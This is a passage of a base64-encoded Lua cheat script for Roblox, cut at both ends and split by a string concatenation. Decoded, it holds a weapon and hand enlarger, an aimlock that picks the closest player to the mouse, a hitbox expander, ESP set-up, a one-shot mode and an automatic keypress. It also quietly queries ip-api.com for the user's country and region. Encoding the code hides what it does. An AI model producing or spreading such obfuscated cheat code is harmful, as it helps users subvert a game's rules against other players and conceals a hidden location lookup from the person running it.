iBvcmlnaW5hbEhhbmRTaXplc1siTGVmdCJdID0gbGVmdEhhbmQuU2l6ZSBlbmQKICAgICAgICAgICAgbGVmdEhhbmQuU2l6ZSA9IFZlY3RvcjMubmV3KDIsIDIsIDIpICogbXVsdGlwbGllciAtLSBFbmxhcmdlIGhhbmRzCiAgICAgICAgICAgIGxlZnRIYW5kLlRyYW5zcGFyZW5jeSA9IENvbmZpZy5XZWFwb25UcmFuc3BhcmVuY3kKICAgICAgICBlbmQKICAgICAgICBpZiByaWdodEhh" .. "bmQgYW5kIHJpZ2h0SGFuZDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICBpZiBub3Qgb3JpZ2luYWxIYW5kU2l6ZXNbIlJpZ2h0Il0gdGhlbiBvcmlnaW5hbEhhbmRTaXplc1siUmlnaHQiXSA9IHJpZ2h0SGFuZC5TaXplIGVuZAogICAgICAgICAgICByaWdodEhhbmQuU2l6ZSA9IFZlY3RvcjMubmV3KDIsIDIsIDIpICogbXVsdGlwbGllciAtLSBFbmxhcmdlIGhhbmRzCiAgICAgICAgICAgIHJpZ2h0SGFuZC5UcmFuc3BhcmVuY3kgPSBDb25maWcuV2VhcG9uVHJhbnNwYXJlbmN5CiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBSZXN0b3JlV2VhcG9uU2l6ZSgpCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjaGFyYWN0ZXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgLS0gUmVzdG9yZSBUb29scwogICAgICAgIGZvciB0b29sTmFtZSwgZGF0YSBpbiBwYWlycyhvcmlnaW5hbFdlYXBvblNpemVzKSBkbwogICAgICAgICAgICBsb2NhbCB0b29sID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xOYW1lKSBvciBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbE5hbWUpCiAgICAgICAgICAgIGlmIHRvb2wgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgaGFuZGxlID0gdG9vbDpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikKICAgICAgICAgICAgICAgIGlmIGhhbmRsZSBhbmQgZGF0YS5IYW5kbGVTaXplIHRoZW4KICAgICAgICAgICAgICAgICAgICBoYW5kbGUuU2l6ZSA9IGRhdGEuSGFuZGxlU2l6ZQogICAgICAgICAgICAgICAgICAgIGhhbmRsZS5UcmFuc3BhcmVuY3kgPSAwCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGZvciBwYXJ0TmFtZSwgc2l6ZSBpbiBwYWlycyhkYXRhKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHR5cGUoc2l6ZSkgPT0gIlZlY3RvcjMiIGFuZCBwYXJ0TmFtZSB+PSAiSGFuZGxlU2l6ZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHAgaW4gcGFpcnModG9vbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHAuTmFtZSA9PSBwYXJ0TmFtZSBhbmQgcDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwLlNpemUgPSBzaXplCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuVHJhbnNwYXJlbmN5ID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gUmVzdG9yZSBIYW5kcwogICAgICAgIGxvY2FsIGxlZnRIYW5kID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdCBBcm0iKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRBcm0iKQogICAgICAgIGxvY2FsIHJpZ2h0SGFuZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodCBBcm0iKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0QXJtIikKICAgICAgICBpZiBsZWZ0SGFuZCBhbmQgbGVmdEhhbmQ6SXNBKCJCYXNlUGFydCIpIGFuZCBvcmlnaW5hbEhhbmRTaXplc1siTGVmdCJdIHRoZW4KICAgICAgICAgICAgbGVmdEhhbmQuU2l6ZSA9IG9yaWdpbmFsSGFuZFNpemVzWyJMZWZ0Il0KICAgICAgICAgICAgbGVmdEhhbmQuVHJhbnNwYXJlbmN5ID0gMAogICAgICAgIGVuZAogICAgICAgIGlmIHJpZ2h0SGFuZCBhbmQgcmlnaHRIYW5kOklzQSgiQmFzZVBhcnQiKSBhbmQgb3JpZ2luYWxIYW5kU2l6ZXNbIlJpZ2h0Il0gdGhlbgogICAgICAgICAgICByaWdodEhhbmQuU2l6ZSA9IG9yaWdpbmFsSGFuZFNpemVzWyJSaWdodCJdCiAgICAgICAgICAgIHJpZ2h0SGFuZC5UcmFuc3BhcmVuY3kgPSAwCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBXYXRjaEZvck5ld1Rvb2xzKCkKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgaWYgbm90IGNoYXJhY3RlciB0aGVuIHJldHVybiBlbmQKICAgICAgICAKICAgICAgICB0YWJsZS5pbnNlcnQoQ29ubmVjdGlvbnMsIGNoYXJhY3Rlci5DaGlsZEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hpbGQpCiAgICAgICAgICAgIGlmIGNoaWxkOklzQSgiVG9vbCIpIGFuZCBDb25maWcuV2VhcG9uRXh0ZW5kZXIgdGhlbgogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgIFNldFdlYXBvblNpemUoQ29uZmlnLldlYXBvbkxlbmd0aCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKSkKICAgICAgICAKICAgICAgICB0YWJsZS5pbnNlcnQoQ29ubmVjdGlvbnMsIHBsYXllci5CYWNrcGFjay5DaGlsZEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hpbGQpCiAgICAgICAgICAgIGlmIGNoaWxkOklzQSgiVG9vbCIpIGFuZCBDb25maWcuV2VhcG9uRXh0ZW5kZXIgdGhlbgogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgIFNldFdlYXBvblNpemUoQ29uZmlnLldlYXBvbkxlbmd0aCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKSkKICAgIGVuZAoKICAgIC0tID09PSBTVEFURSA9PT0KICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIHJvb3RQYXJ0ID0gY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgCiAgICBsb2NhbCBjYWNoZWRSZWdpb24gPSAiTG9hZGluZy4uLiIKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGlmIGdhbWUuSHR0cEdldCB0aGVuCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIGRhdGEgPSBIdHRwU2VydmljZTpKU09ORGVjb2RlKGdhbWU6SHR0cEdldCgiaHR0cDovL2lwLWFwaS5jb20vanNvbi8iKSkKICAgICAgICAgICAgICAgIGNhY2hlZFJlZ2lvbiA9IGRhdGEuY291bnRyeSAuLiAiLCAiIC4uIGRhdGEucmVnaW9uTmFtZQogICAgICAgICAgICBlbmQpCiAgICAgICAgZWxzZQogICAgICAgICAgICBjYWNoZWRSZWdpb24gPSAiVW5rbm93biIKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgbG9jYWwgaGFraUF0dGVtcHRlZCA9IGZhbHNlCgogICAgLS0gPT09IEFVVE8gSEFLSSBPTiBMT0FEID09PQogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIGNoYXJhY3Rlci5QYXJlbnQgYW5kIG5vdCBoYWtpQXR0ZW1wdGVkIHRoZW4KICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZEtleUV2ZW50KHRydWUsIEVudW0uS2V5Q29kZS5KLCBmYWxzZSwgZ2FtZSkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRLZXlFdmVudChmYWxzZSwgRW51bS5LZXlDb2RlLkosIGZhbHNlLCBnYW1lKQogICAgICAgICAgICAgICAgaGFraUF0dGVtcHRlZCA9IHRydWUKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIGxvY2FsIGxhc3RUb29sVXNlID0gMAogICAgbG9jYWwgaXNHdWlWaXNpYmxlID0gdHJ1ZQogICAgCiAgICBsb2NhbCBjb21iYXRUYXJnZXQgPSBuaWwKICAgIGxvY2FsIGN1cnNvckxvY2tUYXJnZXQgPSBuaWwKICAgIGxvY2FsIHJlYWNoQ29ubmVjdGlvbiA9IG5pbAogICAgbG9jYWwgYWltbG9ja1RhcmdldCA9IG5pbAogICAgbG9jYWwgbW91c2VDbGlja1RhcmdldCA9IG5pbAogICAgbG9jYWwgYWltbG9ja0VuZFRpbWUgPSAwCiAgICBsb2NhbCBhaW1sb2NrQ29vbGRvd24gPSAwCiAgICBsb2NhbCBhbnRpTGF2YUNvbm5lY3Rpb24gPSBuaWwKICAgIGxvY2FsIHBvdGF0b0Nvbm5lY3Rpb24gPSBuaWwKICAgIGxvY2FsIHdhc0hpdGJveEV4cGFuZGVkID0gZmFsc2UKICAgIGxvY2FsIHRwUmVhY2hEZWJvdW5jZSA9IHt9IC0tIEFudGktU3BhbSBwb3VyIFRQIEhpdAogICAgCiAgICBsb2NhbCBpc09uZVNob3RBY3RpdmUgPSBmYWxzZQogICAgbG9jYWwgb25lU2hvdFRocmVhZCA9IG5pbAogICAgbG9jYWwgaW5zdGFudFJlc3Bhd25Db25uID0gbmlsCiAgICAKICAgIC0tIFRyaWdnZXIgRmxhc2hTdGVwIFN0YXRlCiAgICBsb2NhbCBsYXN0Rmxhc2hTdGVwVGFyZ2V0ID0gbmlsCiAgICBsb2NhbCBsYXN0Rmxhc2hTdGVwVGltZSA9IDAKICAgIAogICAgLS0gVGFibGUgcG91ciBzdG9ja2VyIGxlcyBib3V0b25zIGV0IGxlcyBtZXR0cmUgw6Agam91cgogICAgbG9jYWwgVG9nZ2xlQnV0dG9ucyA9IHt9IAogICAgbG9jYWwgS2V5YmluZEJ1dHRvbnMgPSB7fQogICAgbG9jYWwgSW5wdXRCb3hlcyA9IHt9CiAgICBsb2NhbCBDb25uZWN0aW9ucyA9IHt9CiAgICAKICAgIC0tID09PSBEUkFXSU5HIEFQSSAoRk9WIENJUkNMRSkgPT09CiAgICBsb2NhbCBGT1ZDaXJjbGUgPSBEcmF3aW5nLm5ldygiQ2lyY2xlIikKICAgIEZPVkNpcmNsZS5UaGlja25lc3MgPSAyCiAgICBGT1ZDaXJjbGUuTnVtU2lkZXMgPSAxMDAKICAgIEZPVkNpcmNsZS5SYWRpdXMgPSBDb25maWcuU2lsZW50Rk9WCiAgICBGT1ZDaXJjbGUuRmlsbGVkID0gZmFsc2UKICAgIEZPVkNpcmNsZS5WaXNpYmxlID0gZmFsc2UKICAgIEZPVkNpcmNsZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBGT1ZDaXJjbGUuVHJhbnNwYXJlbmN5ID0gMC41CiAgICAKICAgIC0tID09PSBFU1AgU0VUVVAgPT09CiAgICBsb2NhbCBFU1BGb2xkZXIgPSBJbnN0YW5jZS5uZXcoIkZvbGRlciIpCiAgICBFU1BGb2xkZXIuTmFtZSA9ICJDeWJlcnB1bmtzX0VTUCIKICAgIHBjYWxsKGZ1bmN0aW9uKCkgRVNQRm9sZGVyLlBhcmVudCA9IENvcmVHdWkgZW5kKQogICAgaWYgbm90IEVTUEZvbGRlci5QYXJlbnQgdGhlbiBFU1BGb2xkZXIuUGFyZW50ID0gcGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikgZW5kCgogICAgLS0gPT09IEhFTFBFUiBGVU5DVElPTlMgPT09CiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGdldENsb3Nlc3RQbGF5ZXJUb01vdXNlKGZvdlJhZGl1cywgdXNlRmlsdGVyKQogICAgICAgIGxvY2FsIGNsb3Nlc3RQbGF5ZXIgPSBuaWwKICAgICAgICAKICAgICAgICAtLSBGaXggSGl0Ym94IEV4dGVuZGVyOiBBdWdtZW50ZSBsZSBGT1YgcG91ciBkw6l0ZWN0ZXIgbGVzIGNsaWNzIHN1ciBsZXMgYm9yZHMgZGVzIGhpdGJveGVzIGfDqWFudGVzCiAgICAgICAgbG9jYWwgZWZmZWN0aXZlRk9WID0gZm92UmFkaXVzCiAgICAgICAgaWYgQ29uZmlnLkhpdGJveEV4cGFuZGVyIHRoZW4gZWZmZWN0aXZlRk9WID0gMjAwMCBlbmQgCiAgICAgICAgCiAgICAgICAgbG9jYWwgc2hvcnRlc3REaXN0YW5jZSA9IGVmZmVjdGl2ZUZPViBvciBtYXRoLmh1Z2UKICAgICAgICBsb2NhbCBtb3VzZVBvcyA9IFVzZXJJbnB1dFNlcnZpY2U6R2V0TW91c2VMb2NhdGlvbigpCgogICAgICAgIGZvciBfLCBwIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICBpZiBwIH49IHBsYXllciBhbmQgcC5DaGFyYWN0ZXIgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCBwLkNoYXJhY3Rlci5IdW1hbm9pZC5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBhcnQgPSBwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpIG9yIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gQWltIEZpbHRlciBDaGVjawogICAgICAgICAgICAgICAgbG9jYWwgYWxsb3cgPSB0cnVlCiAgICAgICAgICAgICAgICBpZiBDb25maWcuVGVhbUNoZWNrIGFuZCBwLlRlYW0gYW5kIHBsYXllci5UZWFtIGFuZCBwLlRlYW0gPT0gcGxheWVyLlRlYW0gdGhlbiBhbGxvdyA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgaWYgdXNlRmlsdGVyIGFuZCBDb25maWcuQWltRmlsdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdGF0dXMgPSBDb25maWcuQWltRmlsdGVyTGlzdFtwLk5hbWVdCiAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLkFpbUZpbHRlck1vZGUgPT0gIldoaXRlbGlzdCIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLkFpbUZpbHRlcldoaXRlbGlzdFtwLk5hbWVdIHRoZW4gYWxsb3cgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgc3RhdHVzIH49ICJXaGl0ZWxpc3QiIHRoZW4gYWxsb3cgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgQ29uZmlnLkFpbUZpbHRlck1vZGUgPT0gIkJsYWNrbGlzdCIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuQWltRmlsdGVyQmxhY2tsaXN0W3AuTmFtZV0gdGhlbiBhbGxvdyA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBzdGF0dXMgPT0gIkJsYWNrbGlzdCIgdGhlbiBhbGxvdyA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHRhcmdldFBhcnQgYW5kIGFsbG93IHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBpc0luUmFuZ2UgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgaWYgcm9vdFBhcnQgYW5kIENvbmZpZy5TaWxlbnRSYW5nZSA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkaXN0ID0gKHJvb3RQYXJ0LlBvc2l0aW9uIC0gdGFyZ2V0UGFydC5Qb3NpdGlvbikuTWFnbml0dWRlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRpc3QgPiBDb25maWcuU2lsZW50UmFuZ2UgdGhlbiBpc0luUmFuZ2UgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBpc0luUmFuZ2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwb3MsIG9uU2NyZWVuID0gY2FtZXJhOldvcmxkVG9WaWV3cG9ydFBvaW50KHRhcmdldFBhcnQuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9uU2NyZWVuIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3RhbmNlID0gKFZlY3RvcjIubmV3KG1vdXNlUG9zLlgsIG1vdXNlUG9zLlkpIC0gVmVjdG9yMi5uZXcocG9zLlgsIHBvcy5ZKSkuTWFnbml0dWRlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkaXN0YW5jZSA8IHNob3J0ZXN0RGlzdGFuY2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsb3Nlc3RQbGF5ZXIgPSBwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hvcnRlc3REaXN0YW5jZSA9IGRpc3RhbmNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuIGNsb3Nlc3RQbGF5ZXIKICAgIGVuZAogICAgCiAgICAtLSBDaWJsZSBUT1VUIChOUEMgKyBKb3VldXJzKQogICAgbG9jYWwgZnVuY3Rpb24gZ2V0Q2xvc2VzdEVuZW15KHJhbmdlKQogICAgICAgIGxvY2FsIGNsb3Nlc3QgPSBuaWwKICAgICAgICBsb2NhbCBkaXN0ID0gcmFuZ2UKICAgICAgICAKICAgICAgICAtLSBTY2FuIFdvcmtzcGFjZSBDaGlsZHJlbiAoTlBDcykKICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKFdvcmtzcGFjZTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBvYmogfj0gY2hhcmFjdGVyIGFuZCBvYmo6SXNBKCJNb2RlbCIpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGh1bSA9IG9iajpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgbG9jYWwgcm9vdCA9IG9iajpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGh1bSBhbmQgcm9vdCBhbmQgaHVtLkhlYWx0aCA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIG1hZyA9IChyb290UGFydC5Qb3NpdGlvbiAtIHJvb3QuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgIGlmIG1hZyA8IGRpc3QgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjbG9zZXN0ID0gb2JqCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc3QgPSBtYWcKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBTY2FuIFBsYXllcnMKICAgICAgICBmb3IgXywgcCBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcCB+PSBwbGF5ZXIgYW5kIHAuQ2hhcmFjdGVyIGFuZCBwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIGFuZCBwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSBhbmQgcC5DaGFyYWN0ZXIuSHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBtYWcgPSAocm9vdFBhcnQuUG9zaXRpb24gLSBwLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgIGlmIG1hZyA8IGRpc3QgdGhlbgogICAgICAgICAgICAgICAgICAgIGNsb3Nlc3QgPSBwLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIGRpc3QgPSBtYWcKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICByZXR1cm4gY2xvc2VzdAogICAgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGdldENsb3Nlc3RUYXJnZXRUb01vdXNlKGZvdlJhZGl1cykKICAgICAgICBsb2NhbCBjbG9zZXN0ID0gbmlsCiAgICAgICAgbG9jYWwgbWluRGlzdCA9IGZvdlJhZGl1cyBvciBtYXRoLmh1Z2UKICAgICAgICBsb2NhbCBtb3VzZVBvcyA9IFVzZXJJbnB1dFNlcnZpY2U6R2V0TW91c2VMb2NhdGlvbigpCiAgICAgICAgCiAgICAgICAgLS0gQ2hlY2sgUGxheWVycwogICAgICAgIGZvciBfLCBwIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICBpZiBwIH49IHBsYXllciBhbmQgcC5DaGFyYWN0ZXIgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCBwLkNoYXJhY3Rlci5IdW1hbm9pZC5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBwLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgICAgICBsb2NhbCBwb3MsIG9uU2NyZWVuID0gY2FtZXJhOldvcmxkVG9WaWV3cG9ydFBvaW50KHJvb3QuUG9zaXRpb24pCiAgICAgICAgICAgICAgICBpZiBvblNjcmVlbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGlzdCA9IChWZWN0b3IyLm5ldyhtb3VzZVBvcy5YLCBtb3VzZVBvcy5ZKSAtIFZlY3RvcjIubmV3KHBvcy5YLCBwb3MuWSkpLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgIGlmIGRpc3QgPCBtaW5EaXN0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgY2xvc2VzdCA9IHAuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbkRpc3QgPSBkaXN0CiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gQ2hlY2sgTlBDcwogICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMoV29ya3NwYWNlOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIG9iajpJc0EoIk1vZGVsIikgYW5kIG9iaiB+PSBjaGFyYWN0ZXIgYW5kIG9iajpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIGFuZCBvYmo6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgYW5kIG9iai5IdW1hbm9pZC5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBvYmouSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgbG9jYWwgcG9zLCBvblNjcmVlbiA9IGNhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludChyb290LlBvc2l0aW9uKQogICAgICAgICAgICAgICAgaWYgb25TY3JlZW4gdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAoVmVjdG9yMi5uZXcobW91c2VQb3MuWCwgbW91c2VQb3MuWSkgLSBWZWN0b3IyLm5ldyhwb3MuWCwgcG9zLlkpKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgICAgICBpZiBkaXN0IDwgbWluRGlzdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGNsb3Nlc3QgPSBvYmoKICAgICAgICAgICAgICAgICAgICAgICAgbWluRGlzdCA9IGRpc3QKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICByZXR1cm4gY2xvc2VzdAogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gZ2V0Q29sb3JBdCh4LCB5KQogICAgICAgIC0tIDEuIFByaW9yaXR5OiBnZXRjb2xvciAoUmVhZHMgc2NyZWVuIHBpeGVscyBpbmNsdWRpbmcgVUkvR1VJKQogICAgICAgIGlmIGdldGNvbG9yIHRoZW4KICAgICAgICAgICAgcmV0dXJuIGdldGNvbG9yKFZlY3RvcjIubmV3KHgsIHkpKQogICAgICAgIGVuZAogICAgICAgIC0tIDIuIEZhbGxiYWNrOiBSYXljYXN0ICgzRCBXb3JsZCBvbmx5IC0gQ2Fubm90IHNlZSBVSSkKICAgICAgICBsb2NhbCBpbnNldCA9IEd1aVNlcnZpY2U6R2V0R3VpSW5zZXQoKQogICAgICAgIGxvY2FsIHJheSA9IGNhbWVyYTpWaWV3cG9ydFBvaW50VG9SYXkoeCwgeSAtIGluc2V0LlkpCiAgICAgICAgCiAgICAgICAgbG9jYWwgcGFyYW1zID0gUmF5Y2FzdFBhcmFtcy5uZXcoKQogICAgICAgIHBhcmFtcy5GaWx0ZXJUeXBlID0gRW51bS5SYXljYXN0RmlsdGVyVHlwZS5FeGNsdWRlCiAgICAgICAgcGFyYW1zLkZpbHRlckRlc2NlbmRhbnRzSW5zdGFuY2VzID0ge2NoYXJhY3RlciwgRVNQRm9sZGVyLCBjYW1lcmF9CiAgICAgICAgCiAgICAgICAgbG9jYWwgcmVzID0gd29ya3NwYWNlOlJheWNhc3QocmF5Lk9yaWdpbiwgcmF5LkRpcmVjdGlvbiAqIDEwMDAsIHBhcmFtcykKICAgICAgICBpZiByZXMgYW5kIHJlcy5JbnN0YW5jZSBhbmQgcmVzLkluc3RhbmNlOklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgIHJldHVybiByZXMuSW5zdGFuY2UuQ29sb3IKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gQ29sb3IzLm5ldygwLDAsMCkKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGFwcGx5VG9vbENvbG9yKG9iaikKICAgICAgICBpZiBub3QgQ29uZmlnLlRvb2xDb2xvckNoYW5nZXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBvYmo6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBvYmo6R2V0QXR0cmlidXRlKCJPcmlnaW5hbENvbG9yIikgdGhlbgogICAgICAgICAgICAgICAgICAgIG9iajpTZXRBdHRyaWJ1dGUoIk9yaWdpbmFsQ29sb3IiLCBvYmouQ29sb3IpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIG